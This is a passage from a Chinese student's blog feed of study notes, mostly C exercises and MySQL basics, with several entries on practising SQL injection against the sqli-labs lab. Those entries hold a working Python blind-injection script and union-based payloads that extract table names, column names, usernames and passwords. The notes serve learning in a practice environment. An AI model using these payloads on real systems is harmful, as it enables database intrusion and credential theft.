y &gt; <span class="number">-1.5</span>; y-=<span class="number">0.1</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (x = <span class="number">-1.5</span>; x &lt; <span class="number">1.5</span>; x+=<span class="number">0.05</span>)&#123;</span><br><span class="line">a = x * x + y * y - <span class="number">1</span>;</span><br><span class="line"><span class="built_in">putchar</span>(a * a * a - x * x * y * y * y &lt;= <span class="number">0.0</span>?<span class="string">&#x27;*&#x27;</span>:<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;color 0c&quot;</span>);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;红色爱心代码&quot;&gt;&lt;a href=&quot;#红色爱心代码&quot; class=&quot;headerlink&quot; title=&quot;红色爱心代码&quot;&gt;&lt;/a&gt;红色爱心代码&lt;/h1&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://wifi-0x.github.io/2021/11/21/lab%208/"/>
    <id>http://wifi-0x.github.io/2021/11/21/lab%208/</id>
    <published>2021-11-21T09:53:43.302Z</published>
    <updated>2021-11-21T09:53:43.668Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lab-8"><a href="#lab-8" class="headerlink" title="lab 8"></a>lab 8</h1><p>使用python脚本进行盲注</p><p>1，刷出库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">dic=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload: and substr(database(),1,1)=&#x27;s&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> dic:</span><br><span class="line">        url=<span class="string">&quot;http://d1c0c861-091f-4ff0-9aaa-64dbc53cfc23.node4.buuoj.cn/Less-8/?id=1%27&quot;</span></span><br><span class="line">        payload=<span class="string">&quot; and substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br><span class="line">        url = url + payload</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;are&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=char</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2，刷出表名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;and substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,&quot;</span> \</span><br><span class="line">          <span class="string">&quot;1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i, char)</span><br></pre></td></tr></table></figure><p>limit  后面的数字可变 </p><p>第一个表：limit 0</p><p>第二个表：limit 1 </p><p>……</p><p>3，刷出列名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,&quot;</span> \</span><br><span class="line">          <span class="string">&quot;1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i, char)</span><br></pre></td></tr></table></figure><p>limit  后面的数字可变 </p><p>第一列：limit 0</p><p>第二列：limit 1 </p><p>……</p><p>4，查用户名或密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="string">&quot;and substr((select username from security.users limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="string">&quot;and substr((select password from security.users limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;lab-8&quot;&gt;&lt;a href=&quot;#lab-8&quot; class=&quot;headerlink&quot; title=&quot;lab 8&quot;&gt;&lt;/a&gt;lab 8&lt;/h1&gt;&lt;p&gt;使用python脚本进行盲注&lt;/p&gt;
&lt;p&gt;1，刷出库名&lt;/p&gt;
&lt;figure class=&quot;highlight </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://wifi-0x.github.io/2021/11/19/lab/"/>
    <id>http://wifi-0x.github.io/2021/11/19/lab/</id>
    <published>2021-11-19T06:47:57.480Z</published>
    <updated>2021-11-19T06:47:57.982Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lab"><a href="#lab" class="headerlink" title="lab"></a>lab</h1><p>?id=10’union select 1,table_name,3 from information_schema.tables where table_schema=’security’ limit 0,1 – qwe //一个一个地查表 </p><p>?id=10’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+</p><p>//一次查出全部的表但是可能因为显示位不够而漏掉一些内容</p><p><img src="https://i.loli.net/2021/11/19/qPmFyh4n8TeJdkb.png"></p><p><img src="https://i.loli.net/2021/11/16/pTwogVcQKPFzJti.png"></p><p>1.<code>?id=1&#39;</code></p><p>2.输入order by语句对字段进行猜测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure><p>3.输入 <code>?id=-1&#39; union select 1,2,3, --+</code></p><p>4,爆数据库（得到数据库名称security）<code>?id=-1&#39; union select 2,3, database() --+</code></p><p>5,爆表名（得到表名users）<code>?id=-1&#39; union select 2,3,group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39; --+</code></p><p>6.爆列名（得到列名username，password…）<code>?id=-1&#39; union select 2,3, group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></p><p>7.查询内容 <code>?id=-1 union select 2,3, group_concat (username, &#39;:&#39;,password)from security.users --+</code></p><p>2021 11 19 </p><p>在实验室学习的一天</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;lab&quot;&gt;&lt;a href=&quot;#lab&quot; class=&quot;headerlink&quot; title=&quot;lab&quot;&gt;&lt;/a&gt;lab&lt;/h1&gt;&lt;p&gt;?id=10’union select 1,table_name,3 from information_schema.tables </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://wifi-0x.github.io/2021/11/16/mysql%20%E7%9A%84%E5%87%BD%E6%95%B0/"/>
    <id>http://wifi-0x.github.io/2021/11/16/mysql%20%E7%9A%84%E5%87%BD%E6%95%B0/</id>
    <published>2021-11-16T15:15:58.833Z</published>
    <updated>2021-11-16T15:15:59.058Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/16/pTwogVcQKPFzJti.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/16/pTwogVcQKPFzJti.png&quot;&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://wifi-0x.github.io/2021/11/16/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E8%BF%98%E6%98%AF%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5/"/>
    <id>http://wifi-0x.github.io/2021/11/16/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E8%BF%98%E6%98%AF%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5/</id>
    <published>2021-11-16T12:12:57.287Z</published>
    <updated>2021-11-16T14:15:37.069Z</updated>
    
    <content type="html"><![CDATA[<h1 id="如何判断是字符型注入还是数字型注入"><a href="#如何判断是字符型注入还是数字型注入" class="headerlink" title="如何判断是字符型注入还是数字型注入"></a>如何判断是字符型注入还是数字型注入</h1><p><img src="https://i.loli.net/2021/11/16/eQJ8KEMIw93Ut4C.png"></p><pre><code> 1：字符型会自动加入两个单引号。 2：数字型不会加入两个单引号。 3：被单引号括起来的数据会被当成一个整体。 4：LIMIT m,n 会影响select语句的结果。 5：页面回显发生错误和页面不回显数据是两回事。前者表示sql语句出错了，后者表示sql语句没有错误，但是条件不成立。</code></pre><h1 id="union用法："><a href="#union用法：" class="headerlink" title="union用法："></a>union用法：</h1><p>UNION操作符用于合并两个或多个SELECT语句的结果集，而且UNION内部的SELECT语句必须拥<br>有相同数量的列，列也必须拥有相似的数据类型，同时，每条SELCCT语句中的列的顺序必须相同。<br>说白了，就是把两个表的结果拼接成为一个表，能够拼接的前提是两个表都用相同的列，你是3列，<br>我也是3列。<br>前面讲过我们要做的第一件事，是判断有多少列，主要目的就是为了使用union联合查询。<br>(因为要构造相同数量的列)</p><h1 id="group-concat-用法："><a href="#group-concat-用法：" class="headerlink" title="group_concat()用法："></a>group_concat()用法：</h1><p>group_concat(id)              表示把id字段的值在同一行打印出来，逗号分隔(默认)<br>group_concat(‘<em>‘,id1,id2)   表示使用</em>进行分割，拼接id1和id2</p><h1 id="判断是否存在注入点"><a href="#判断是否存在注入点" class="headerlink" title="判断是否存在注入点"></a>判断是否存在注入点</h1><p>使用+ 或 -</p><p>id=1+1</p><p>id=2-1</p><p>当符号不能直接使用时用下面的网址进行<strong>转换</strong></p><p><a href="http://tool.chinaz.com/tools/urlencode.aspx">http://tool.chinaz.com/tools/urlencode.aspx</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;如何判断是字符型注入还是数字型注入&quot;&gt;&lt;a href=&quot;#如何判断是字符型注入还是数字型注入&quot; class=&quot;headerlink&quot; title=&quot;如何判断是字符型注入还是数字型注入&quot;&gt;&lt;/a&gt;如何判断是字符型注入还是数字型注入&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://wifi-0x.github.io/2021/11/11/%E7%A7%80%E5%93%A5%E7%A1%AC%E6%A0%B8SQL/"/>
    <id>http://wifi-0x.github.io/2021/11/11/%E7%A7%80%E5%93%A5%E7%A1%AC%E6%A0%B8SQL/</id>
    <published>2021-11-11T13:01:23.390Z</published>
    <updated>2022-02-25T13:47:14.400Z</updated>
    
    <content type="html"><![CDATA[<h1 id="秀哥硬核SQL"><a href="#秀哥硬核SQL" class="headerlink" title="秀哥硬核SQL"></a>秀哥硬核SQL</h1><hr><p><strong>有什么库</strong>       show databases;</p><p><strong>有什么表</strong>       show tables;</p><p><strong>表里的结构</strong>    desc 表名；</p><p><strong>使用库</strong>            use 库名；</p><p><strong>建立库</strong>            create database 库名</p><p><strong>删除库</strong>            drop database 库名</p><p><strong>建立表</strong>            create table 表名 (字段名1 字段类型，字段名2 字段类型) </p><h4 id="常见类型-数字-int-字符串-varchar-需要加“-”"><a href="#常见类型-数字-int-字符串-varchar-需要加“-”" class="headerlink" title="常见类型 数字 int 字符串 varchar(需要加“ ”)"></a><u><em>常见类型 数字 int 字符串 varchar</em></u>(需要加“ ”)</h4><p><strong>删除表</strong>            drop table 表名</p><h3 id="修改表内字段"><a href="#修改表内字段" class="headerlink" title="修改表内字段{"></a><strong>修改表内字段</strong>{</h3><p><strong>增加字段</strong> alter table 表名 add 字段名 字段类型</p><p><strong>删字段</strong> alter table 表名 drop 字段名</p><p><strong>修改表内字段名</strong> alter table 表名 change 旧字符名 新字符名 新类型 </p><p>}</p><h3 id="往表内插入数据（增）暂时不会插入汉字"><a href="#往表内插入数据（增）暂时不会插入汉字" class="headerlink" title="往表内插入数据（增）暂时不会插入汉字"></a><strong>往表内插入数据（增）</strong>暂时不会插入汉字</h3><p>：insert into 表名values (值1, 值2);//按顺序插入</p><p>​                                         或者 insert into 表名（列名1，列名2） values(值1， 值2)</p><p><strong>修改数据</strong> update 表名 set 列名=新值 where 列名=旧值</p><p>​                 update 表名 set 列名=新列值，列名2=新列值 where 列名 =旧列值</p><p><strong>删除数据</strong> delete from 表名 where 列名=列值  </p><p>//这会删除这列中的一个数 </p><p>//如果不写 where及后面的东西 就会删除整个表</p><p>​                  </p><h3 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h3><p>select*from 表名 where 条件（条件可以这样写 列名=”这列中的某个数据”）</p><p>select  字段名 from 表名 where 条件 </p><p>SELECT *FROM 表名 ORDER BY 列名(可以用1，2，3.) </p><p>  //在最后面加<strong>desc</strong>将以降序排列</p><h5 id="休眠-select-sleep（10）；-服务器摸鱼10s"><a href="#休眠-select-sleep（10）；-服务器摸鱼10s" class="headerlink" title="休眠 select sleep（10）； //服务器摸鱼10s"></a>休眠 select sleep（10）； //服务器摸鱼10s</h5><p><strong>注意</strong></p><p><em>1 SQL语句结尾要加 ;</em></p><p><em>2 数据库语句部分大小写，但是数据分</em></p><p><em>3 数值要加   ‘66’</em></p><h3 id="cmd的命令"><a href="#cmd的命令" class="headerlink" title="cmd的命令"></a>cmd的命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//进入d盘</span><br><span class="line">D:</span><br><span class="line">//进入F盘</span><br><span class="line">F:</span><br><span class="line">查看当前目录 dir</span><br><span class="line">打开 cd</span><br><span class="line">返回上一级 cd ..</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="打开mysql"><a href="#打开mysql" class="headerlink" title="打开mysql"></a>打开mysql</h3><p>D:\phpStudy\PHPTutorial\MySQL\bin&gt;mysql -u root -p</p><p>第一步 d：//切换到d盘</p><p>第二步  cd D:\phpStudy\PHPTutorial\MySQL\bin&gt;mysql</p><p>第三步  mysql -u root -****</p><p>2021 11 15 星期一</p><h1 id="Fighting"><a href="#Fighting" class="headerlink" title="Fighting"></a><em><strong>Fighting</strong></em></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;秀哥硬核SQL&quot;&gt;&lt;a href=&quot;#秀哥硬核SQL&quot; class=&quot;headerlink&quot; title=&quot;秀哥硬核SQL&quot;&gt;&lt;/a&gt;秀哥硬核SQL&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;有什么库&lt;/strong&gt;       show databases;&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://wifi-0x.github.io/2021/11/09/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0/"/>
    <id>http://wifi-0x.github.io/2021/11/09/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0/</id>
    <published>2021-11-09T14:20:27.853Z</published>
    <updated>2021-11-09T14:20:28.132Z</updated>
    
    <content type="html"><![CDATA[<h1 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h1><p><img src="https://i.loli.net/2021/11/09/QEjB8qTLZzp7lUW.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> z = <span class="number">0</span>;</span><br><span class="line">z = x + y;</span><br><span class="line"><span class="keyword">return</span> z;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">565</span>, b=<span class="number">5654</span>;<span class="comment">//什么值都不影响</span></span><br><span class="line">scanf_s(<span class="string">&quot;%d%d&quot;</span>, &amp;a,&amp;b);<span class="comment">//两个%d之间不能有’，‘</span></span><br><span class="line"><span class="keyword">int</span> c = Add(a, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/09/NL2ikjAetyofvUM.png"></p><p><em>天气晴 今天好冷</em></p><p>2021 11 09</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;自定义函数&quot;&gt;&lt;a href=&quot;#自定义函数&quot; class=&quot;headerlink&quot; title=&quot;自定义函数&quot;&gt;&lt;/a&gt;自定义函数&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/09/QEjB8qTLZzp7lUW.pn</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://wifi-0x.github.io/2021/11/04/November%204,2021/"/>
    <id>http://wifi-0x.github.io/2021/11/04/November%204,2021/</id>
    <published>2021-11-04T08:01:48.522Z</published>
    <updated>2021-11-04T11:19:20.260Z</updated>
    
    <content type="html"><![CDATA[<h1 id="November-4-2021"><a href="#November-4-2021" class="headerlink" title="November 4,2021"></a>November 4,2021</h1><h3 id="普通查找"><a href="#普通查找" class="headerlink" title="普通查找"></a>普通查找</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> arr[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> k = <span class="number">6</span>;</span><br><span class="line"><span class="comment">//写一个代码，在arr数组中找到7</span></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> sz = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);计算元素个数</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (k == arr[i]) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到了，下标是：%d\n&quot;</span>, i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (i == sz)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找不到\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h3><p><em>在顺序结构中查询的效率更高</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int arr[] = &#123;1,2,3,4,5,6,7,8,9,10&#125;;</span><br><span class="line">int k = 15;**这里输入想查询的数</span><br><span class="line">//写一个代码，在arr数组(按顺序排序)中找到7</span><br><span class="line">int sz = sizeof(arr) / sizeof(arr[0]);</span><br><span class="line">int left = 0;</span><br><span class="line">int right = sz - 1;</span><br><span class="line"></span><br><span class="line">while (left &lt;= right)</span><br><span class="line">&#123;</span><br><span class="line">int mid = (left + right) / 2;</span><br><span class="line">if (arr[mid] &gt; k)</span><br><span class="line">&#123;</span><br><span class="line">right = mid - 1;</span><br><span class="line">&#125;</span><br><span class="line">else if (arr[mid] &lt; k)</span><br><span class="line">&#123;</span><br><span class="line">left = mid + 1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;找到了，下标是:%d\n&quot;, mid);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (left&gt;right)</span><br><span class="line">printf(&quot;找不到\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>####################</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span><span class="comment">//包含Sleep函数（停止）</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span><span class="comment">//-&gt;system</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="comment">//例子 char arr[]=&quot;abc&quot;;</span></span><br><span class="line"><span class="comment">// 括号里面实际为[a b c \0]</span></span><br><span class="line"><span class="comment">// 下标为          0 1 2  3</span></span><br><span class="line"><span class="comment">//字符串结尾总是多出来/0</span></span><br><span class="line"><span class="keyword">char</span> arr1[] = <span class="string">&quot;welcome to bit!!!!!!&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> arr2[] = <span class="string">&quot;####################&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> right = <span class="keyword">sizeof</span>(arr1) / <span class="keyword">sizeof</span>(arr1[<span class="number">0</span>]) - <span class="number">2</span>;<span class="comment">//方法1</span></span><br><span class="line"><span class="comment">//因为下标是从0开始 所以-1 </span></span><br><span class="line"><span class="comment">//因为有\0 所以我们输入的最后一个字符的下标为sz-2</span></span><br><span class="line"><span class="comment">//strlen 头文件要用#include&lt;string.h&gt;。</span></span><br><span class="line"><span class="comment">//strlen()只是统计字符串的长度，统计到&#x27;\0&#x27;结束，但不包括&#x27;\0&#x27;，这个与sizeof()不一样。</span></span><br><span class="line"><span class="comment">// int right = strlen(arr1);方法2</span></span><br><span class="line"><span class="keyword">while</span> (left &lt;= right)</span><br><span class="line">&#123;</span><br><span class="line">arr2[left] = arr1[left];</span><br><span class="line">arr2[right] = arr1[right];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, arr2);</span><br><span class="line">Sleep(<span class="number">500</span>);<span class="comment">//休息500毫秒</span></span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);<span class="comment">//执行系统命令的一个函数 cls 清空屏幕</span></span><br><span class="line">left++;</span><br><span class="line">right--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, arr2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>天气 一天的小雨</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;November-4-2021&quot;&gt;&lt;a href=&quot;#November-4-2021&quot; class=&quot;headerlink&quot; title=&quot;November 4,2021&quot;&gt;&lt;/a&gt;November 4,2021&lt;/h1&gt;&lt;h3 id=&quot;普通查找&quot;&gt;&lt;a href</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://wifi-0x.github.io/2021/11/01/MYSQL/"/>
    <id>http://wifi-0x.github.io/2021/11/01/MYSQL/</id>
    <published>2021-11-01T13:31:01.684Z</published>
    <updated>2021-11-16T14:36:04.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><p>查库：select schema_name from information_schema.schemata;</p><p>查表：select table_name from information_schema.tables where table_schema=’security’;</p><p>查列：select column_name from  information_schema.columns where table_name=’users’;</p><p>查字段：select username,password from security.users;</p><p><img src="https://i.loli.net/2021/11/06/pEtf2gQ7FSAzNnr.png"></p><p><img src="https://i.loli.net/2021/11/06/EKztJmBueQk1ZIx.png"></p><p><img src="https://i.loli.net/2021/11/06/62FztDxqW1IBCPy.png"></p><p>第一步，CREATE DATABASE py2py20py6;</p><p>然后 use py2py20py6;</p><p>再CREATE TABLE stu(id int primary key,name char(10),class int)default charset=utf8mb4;(这里有个小错误)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入数据，<span class="function">INSERT INTO <span class="title">stu</span> <span class="params">(id, name, classid)</span> <span class="title">VALUES</span><span class="params">(<span class="number">1</span>, `张秀哥`, <span class="number">20</span>)</span>,<span class="params">(<span class="number">2</span>, `膨胀哥`, <span class="number">20</span>)</span>,<span class="params">(<span class="number">3</span>, `锋锋`, <span class="number">20</span>)</span>,<span class="params">(<span class="number">4</span>, `卷王`, <span class="number">6</span>)</span>,<span class="params">(<span class="number">5</span>, `小帅`, <span class="number">6</span>)</span>,<span class="params">(<span class="number">6</span>, `帅哥`, <span class="number">6</span>)</span>,<span class="params">(<span class="number">7</span>, `乐乐`, <span class="number">2</span>)</span>,<span class="params">(<span class="number">8</span>, `独秀`, <span class="number">2</span>)</span>,<span class="params">(<span class="number">9</span>, `第一`, <span class="number">2</span>)</span></span>;</span><br></pre></td></tr></table></figure><p><img 